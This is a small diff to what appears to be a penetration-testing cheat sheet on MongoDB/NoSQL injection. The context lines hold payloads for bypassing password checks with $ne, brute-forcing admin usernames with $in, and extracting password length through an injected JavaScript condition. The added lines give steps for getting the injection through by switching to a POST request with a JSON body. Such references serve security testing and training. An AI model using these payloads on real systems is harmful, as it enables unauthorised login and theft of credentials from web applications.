@@ -48,6 +48,11 @@ For URL-based inputs, you can insert query operators via URL parameters. For exa
 {"$ne":"Invalid"} >> For password
 {"$in":["admin","administrator","superadmin"]} >> For bruteforce
 ```
+If this doesn't work, you can try the following:
+    Convert the request method from GET to POST.
+    Change the Content-Type header to application/json.
+    Add JSON to the message body.
+    Inject query operators in the JSON.
 # MongoDB Data Retrieving
 ```
 ' && this.password.length < 50%00 >> For extracting password length in URL
